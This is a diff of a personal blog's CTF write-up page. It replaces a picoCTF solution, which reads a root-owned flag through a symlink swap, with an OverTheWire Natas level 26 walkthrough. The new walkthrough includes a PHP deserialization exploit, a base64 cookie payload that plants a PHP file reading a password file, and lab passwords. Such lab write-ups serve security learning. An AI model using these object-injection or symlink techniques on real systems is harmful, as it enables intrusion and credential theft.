@@ -5,7 +5,7 @@
 	<meta charset="utf-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
 	
-	<title>My messy collection  | dont-you-love-banners</title>
+	<title>My messy collection  | Natas-Level 26</title>
 	<meta name="viewport" content="width=device-width,minimum-scale=1">
 	<meta name="generator" content="Hugo 0.139.0">
 	
@@ -144,7 +144,7 @@ onload='renderMathInElement(document.body);'></script>
 		<a href="/" title="My messy collection" class="heading font-cursive icon">My messy collection</a>
 	</h2>
 </div>
-<h1 class="pt-2">dont-you-love-banners</h1>
+<h1 class="pt-2">Natas-Level 26</h1>
 
 <h3 class="text-java-700 font-normal leading-relaxed pt-2">Writeup</h3>
 
@@ -154,10 +154,10 @@ onload='renderMathInElement(document.body);'></script>
 	
 	
 	<a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400"
-		href='/categories/picoctf'>PicoCTF</a>&nbsp;&#47;
+		href='/categories/overthewire'>Overthewire</a>&nbsp;&#47;
 	
 	<a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400"
-		href='/categories/general-skills'>General skills</a>
+		href='/categories/natas'>Natas</a>
 	
 	
 	
@@ -179,7 +179,7 @@ onload='renderMathInElement(document.body);'></script>
 	
 	
 </div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4"
-		datetime="2024-10-24T15:32:01&#43;03:00">2024-10-24</time>
+		datetime="2024-11-23T13:12:26&#43;02:00">2024-11-23</time>
 </div>
 
 <hr />
@@ -192,108 +192,175 @@ onload='renderMathInElement(document.body);'></script>
 
 <article>
 	<section class="mx-auto content">
-		<div class="c-rich-text"><h3 id="level-description">Level Description</h3>
-<p>Can you abuse the banner? The server has been leaking some crucial information on tethys.picoctf.net 55626. Use the leaked information to get to the server. To connect to the running application use nc tethys.picoctf.net 59416. From the above information abuse the machine and find the flag in the /root directory.</p>
+		<div class="c-rich-text"><h3 id="login">Login</h3>
+<p><em>Username: natas26</em><br>
+<em>Password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE</em><br>
+<em>URL:      <a href="http://natas26.natas.labs.overthewire.org">http://natas26.natas.labs.overthewire.org</a></em></p>
 <h3 id="doc">Doc</h3>
-<p><a href="https://www.freecodecamp.org/news/symlink-tutorial-in-linux-how-to-create-and-remove-a-symbolic-link/">Symlinks.</a></p>
+<p>Burp Suite is a proprietary software tool for security assessment and penetration testing of web applications. It software was initially developed in 2003-2006 by Dafydd Stuttard to automate his own security testing needs, after realizing the capabilities of automatable web tools like Selenium.
+<a href="https://en.wikipedia.org/wiki/Burp_Suite">Source.</a><br>
+Burp Suite tutorial and usefull guides:<br>
+<a href="https://portswigger.net/burp/documentation/desktop/getting-started">Port Swigger.</a><br>
+<a href="https://www.w3schools.com/php/">PHP tutorial.</a></p>
 <h3 id="solution">Solution</h3>
-<p>Logging in on the nc connection provided hits you with a password request.</p>
-<pre tabindex="0"><code>03:35:14 archie@Archie ~ → nc tethys.picoctf.net 52675
-*************************************
-**************WELCOME****************
-*************************************
+<p>The index page presents itself with 4 fields of X`s and Y`s that draw 2 lines from the respective coordinates.</p>
+<img src="/img/natas/natas26-1.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
+<p><strong>Source code:</strong></p>
+<pre tabindex="0"><code>&lt;?php
+    // sry, this is ugly as hell.
+    // cheers kaliman ;)
+    // - morla
 
-what is the password?
-</code></pre><p>The next logical step is to investigate the netcat in the header in order to get the &ldquo;leaked&rdquo; information.</p>
-<pre tabindex="0"><code>03:36:19 archie@Archie ~ → nc tethys.picoctf.net 65227
-SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
-</code></pre><p>That gives you the password and next, you are prompted with some general questions that you can find the answers to on google :</p>
-<pre tabindex="0"><code>03:38:08 archie@Archie ~ → nc tethys.picoctf.net 52675
-*************************************
-**************WELCOME****************
-*************************************
+    class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
 
-what is the password?
-My_Passw@rd_@1234
-What is the top cyber security conference in the world?
-Defcon
-the first hacker ever was known for phreaking(making free phone calls), who was it?
-John Draper
-player@challenge:~$
-</code></pre><p>Now, you are in the machine. Let`s investigate the pwd.</p>
-<pre tabindex="0"><code>player@challenge:~$ ls
-ls
-banner  text
-player@challenge:~$ cat banner
-cat banner
-*************************************
-**************WELCOME****************
-*************************************
-player@challenge:~$ cat text
-cat text
-keep digging
-</code></pre><p>This didn`t help very much but navigationg to the root directory will.</p>
-<pre tabindex="0"><code>player@challenge:/$ cd root
-cd root
-player@challenge:/root$ ls
-ls
-flag.txt  script.py
-player@challenge:/root$ cat flag.txt
-cat flag.txt
-</code></pre><p><strong>script.py :</strong></p>
-<pre tabindex="0"><code>import os
-import pty
+        function __construct($file){
+            // initialise variables
+            $this-&gt;initMsg=&#34;#--session started--#\n&#34;;
+            $this-&gt;exitMsg=&#34;#--session end--#\n&#34;;
+            $this-&gt;logFile = &#34;/tmp/natas26_&#34; . $file . &#34;.log&#34;;
 
-incorrect_ans_reply = &#34;Lol, good try, try again and good luck\n&#34;
+            // write initial message
+            $fd=fopen($this-&gt;logFile,&#34;a+&#34;);
+            fwrite($fd,$this-&gt;initMsg);
+            fclose($fd);
+        }
 
-if __name__ == &#34;__main__&#34;:
-    try:
-      with open(&#34;/home/player/banner&#34;, &#34;r&#34;) as f:
-        print(f.read())
-    except:
-      print(&#34;*********************************************&#34;)
-      print(&#34;***************DEFAULT BANNER****************&#34;)
-      print(&#34;*Please supply banner in /home/player/banner*&#34;)
-      print(&#34;*********************************************&#34;)
+        function log($msg){
+            $fd=fopen($this-&gt;logFile,&#34;a+&#34;);
+            fwrite($fd,$msg.&#34;\n&#34;);
+            fclose($fd);
+        }
 
-try:
-    request = input(&#34;what is the password? \n&#34;).upper()
-    while request:
-        if request == &#39;MY_PASSW@RD_@1234&#39;:
-            text = input(&#34;What is the top cyber security conference in the world?\n&#34;).upper()
-            if text == &#39;DEFCON&#39; or text == &#39;DEF CON&#39;:
-                output = input(
-                    &#34;the first hacker ever was known for phreaking(making free phone calls), who was it?\n&#34;).upper()
-                if output == &#39;JOHN DRAPER&#39; or output == &#39;JOHN THOMAS DRAPER&#39; or output == &#39;JOHN&#39; or output== &#39;DRAPER&#39;:
-                    scmd = &#39;su - player&#39;
-                    pty.spawn(scmd.split(&#39; &#39;))
+        function __destruct(){
+            // write exit message
+            $fd=fopen($this-&gt;logFile,&#34;a+&#34;);
+            fwrite($fd,$this-&gt;exitMsg);
+            fclose($fd);
+        }
+    }
 
-                else:
-                    print(incorrect_ans_reply)
-            else:
-                print(incorrect_ans_reply)
-        else:
-            print(incorrect_ans_reply)
-            break
+    function showImage($filename){
+        if(file_exists($filename))
+            echo &#34;&lt;img src=\&#34;$filename\&#34;&gt;&#34;;
+    }
 
-except:
-    KeyboardInterrupt
-</code></pre><p>The interesting part of all of this is the fact that the script reads the banner file in your home directory using elevated priviledges. This basically boils down to the fact that if you could somehow change the file from banner to flag.txt you could in theory get the password for the next level. Here is where symlinks come in handy. They are basically the same thing as a shortcut on windows. The taught process is that we remove the file, create a link to the file that we actually want to read then run the script.</p>
-<pre tabindex="0"><code>player@challenge:~$ rm banner
-rm banner
-player@challenge:~$ ls
-ls
-text
-player@challenge:~$ ln -s /root/flag.txt banner
-ln -s /root/flag.txt banner
-player@challenge:~$ ls
-ls
-banner  text
-</code></pre><p>Now, when you log into the same instance once again, the script will execute and hopefully spit out the password.</p>
-<p><strong>Next login :</strong></p>
-<pre tabindex="0"><code>03:49:07 archie@Archie ~ → nc tethys.picoctf.net 52675
-picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}
-</code></pre></div>
+    function drawImage($filename){
+        $img=imagecreatetruecolor(400,300);
+        drawFromUserdata($img);
+        imagepng($img,$filename);
+        imagedestroy($img);
+    }
+
+    function drawFromUserdata($img){
+        if( array_key_exists(&#34;x1&#34;, $_GET) &amp;&amp; array_key_exists(&#34;y1&#34;, $_GET) &amp;&amp;
+            array_key_exists(&#34;x2&#34;, $_GET) &amp;&amp; array_key_exists(&#34;y2&#34;, $_GET)){
+
+            $color=imagecolorallocate($img,0xff,0x12,0x1c);
+            imageline($img,$_GET[&#34;x1&#34;], $_GET[&#34;y1&#34;],
+                            $_GET[&#34;x2&#34;], $_GET[&#34;y2&#34;], $color);
+        }
+
+        if (array_key_exists(&#34;drawing&#34;, $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE[&#34;drawing&#34;]));
+            if($drawing)
+                foreach($drawing as $object)
+                    if( array_key_exists(&#34;x1&#34;, $object) &amp;&amp;
+                        array_key_exists(&#34;y1&#34;, $object) &amp;&amp;
+                        array_key_exists(&#34;x2&#34;, $object) &amp;&amp;
+                        array_key_exists(&#34;y2&#34;, $object)){
+
+                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
+                        imageline($img,$object[&#34;x1&#34;],$object[&#34;y1&#34;],
+                                $object[&#34;x2&#34;] ,$object[&#34;y2&#34;] ,$color);
+
+                    }
+        }
+    }
+
+    function storeData(){
+        $new_object=array();
+
+        if(array_key_exists(&#34;x1&#34;, $_GET) &amp;&amp; array_key_exists(&#34;y1&#34;, $_GET) &amp;&amp;
+            array_key_exists(&#34;x2&#34;, $_GET) &amp;&amp; array_key_exists(&#34;y2&#34;, $_GET)){
+            $new_object[&#34;x1&#34;]=$_GET[&#34;x1&#34;];
+            $new_object[&#34;y1&#34;]=$_GET[&#34;y1&#34;];
+            $new_object[&#34;x2&#34;]=$_GET[&#34;x2&#34;];
+            $new_object[&#34;y2&#34;]=$_GET[&#34;y2&#34;];
+        }
+
+        if (array_key_exists(&#34;drawing&#34;, $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE[&#34;drawing&#34;]));
+        }
+        else{
+            // create new array
+            $drawing=array();
+        }
+
+        $drawing[]=$new_object;
+        setcookie(&#34;drawing&#34;,base64_encode(serialize($drawing)));
+    }
+?&gt;
+
+&lt;h1&gt;natas26&lt;/h1&gt;
+&lt;div id=&#34;content&#34;&gt;
+
+Draw a line:&lt;br&gt;
+&lt;form name=&#34;input&#34; method=&#34;get&#34;&gt;
+X1&lt;input type=&#34;text&#34; name=&#34;x1&#34; size=2&gt;
+Y1&lt;input type=&#34;text&#34; name=&#34;y1&#34; size=2&gt;
+X2&lt;input type=&#34;text&#34; name=&#34;x2&#34; size=2&gt;
+Y2&lt;input type=&#34;text&#34; name=&#34;y2&#34; size=2&gt;
+&lt;input type=&#34;submit&#34; value=&#34;DRAW!&#34;&gt;
+&lt;/form&gt;
+
+&lt;?php
+    session_start();
+
+    if (array_key_exists(&#34;drawing&#34;, $_COOKIE) ||
+        (   array_key_exists(&#34;x1&#34;, $_GET) &amp;&amp; array_key_exists(&#34;y1&#34;, $_GET) &amp;&amp;
+            array_key_exists(&#34;x2&#34;, $_GET) &amp;&amp; array_key_exists(&#34;y2&#34;, $_GET))){
+        $imgfile=&#34;img/natas26_&#34; . session_id() .&#34;.png&#34;;
+        drawImage($imgfile);
+        showImage($imgfile);
+        storeData();
+    }
+
+?&gt;
+
+&lt;div id=&#34;viewsource&#34;&gt;&lt;a href=&#34;index-source.html&#34;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p><strong>Important takeaway:</strong></p>
+<p>These are some function that we are gonna utilize in the exploit. The application utilizes a <strong>Logger</strong> class but it is not utilized in any way whatsoever.<br>
+We can see that the drawing cookie is being set by base64 encoding the serialization of the img.<br>
+<strong>setcookie(&ldquo;drawing&rdquo;,base64_encode(serialize($drawing)));</strong></p>
+<h4 id="what-is-serialization-in-php">What is serialization in PHP?</h4>
+<p>Generates a storable representation of a value.<br>
+This is useful for storing or passing PHP values around without losing their type and structure.<br>
+To make the serialized string into a PHP value again, use unserialize().<br>
+<a href="https://www.php.net/manual/en/function.serialize.php">Source.</a></p>
+<h4 id="what-now">What now?</h4>
+<p>We can test this by parsing our default cookie through Cyberchef in reverse order and we should get something tangible.</p>
+<img src="/img/natas/natas26-2.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
+<p>As seen, we get the array representation of the inputed coordinates so in theory, we could reverse the process with whatever value we want for the respective cookie and get a valid running.<br>
+As done before, we can use <strong><? passthru('cat /etc/natas_webpass/natas27'); ?></strong> in a PHP file and then run it by accessing it in the tree at the point where we want to save it.<br>
+So, we are gonna create a PHP file that encodes and serializez a PHP snippet, save it as the cookie and then access the password for the next level.</p>
+<p><strong>Payload code:</strong></p>
+<img src="/img/natas/natas26-3.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
+<p><strong>Run with PHP:</strong></p>
+<pre tabindex="0"><code>02:46:35 archie@Archie pico → php some.php
+Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMToiaW1nL3B3bi5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czoxMDoic29tZXRoaW5nCiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjYxOiI8P3BocCBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOz8+Ijt9
+</code></pre><h4 id="wrapping-up">Wrapping up</h4>
+<p>Now that we`ve got the needed cookie, we can launch burp, modify the current cookie with the modified one in the request and then access the generated php file under the /img directory.</p>
+<img src="/img/natas/natas26-4.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
+<p>After this, let`s check if the PHP file was created.<br>
+Going to /img/pwn2.php in my case reveals the password after running the PHP code.<br>
+<strong>Password for next level:</strong> u3RRffXjysjgwFU6b9xa23i6prmUsYne</p>
+</div>
 	</section>
 
 
@@ -402,7 +469,7 @@ picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}
 	<div class="text-sm text-gray-500 leading-tight a-gray">
 		
 		<br />
-		508 words in this page.
+		592 words in this page.
 	</div>
 </div>
 
@@ -413,21 +480,14 @@ picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}
 <hr class="double-line" />
 <div class="flex flex-wrap justify-between pb-2 leading-loose font-serif">
     
-    <a class="flex-grow-0" href="/post/picoctf2/">
+    <a class="flex-grow-0" href="/post/socket/">
         <svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24"
             height="24">
             <path fill="none" d="M0 0h24v24H0z" />
             <path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z" /></svg>
-        Picker IV
+        Socket
     </a>
     
-    
-    <a class="flex-grow-0" href="/post/socket/">
-        Socket
-        <svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24"
-            height="24">
-            <path fill="none" d="M0 0h24v24H0z" />
-            <path d="M16.172 11l-5.364-5.364 1.414-1.414L20 12l-7.778 7.778-1.414-1.414L16.172 13H4v-2z" /></svg></a>
     
 </div>
 <div >
@@ -437,6 +497,8 @@ picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}
 <div class="font-serif pb-2 flex align-start leading-loose">
 	<span class="heading pr-6 leading-loose">Related</span>
 	<span >
+		
+			<a href="/post/picoctf3/">dont-you-love-banners</a>&nbsp;&nbsp;&#47;&nbsp;
 		
 			<a href="/post/picoctf2/">Picker IV</a>&nbsp;&nbsp;&#47;&nbsp;
 		
@@ -464,9 +526,7 @@ picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}
 		
 			<a href="/post/natas14/">Natas-Level 14</a>&nbsp;&nbsp;&#47;&nbsp;
 		
-			<a href="/post/natas13/">Natas-Level 13</a>&nbsp;&nbsp;&#47;&nbsp;
-		
-			<a href="/post/natas12/">Natas-Level 12</a>
+			<a href="/post/natas13/">Natas-Level 13</a>
 		
 </span>
 </div>
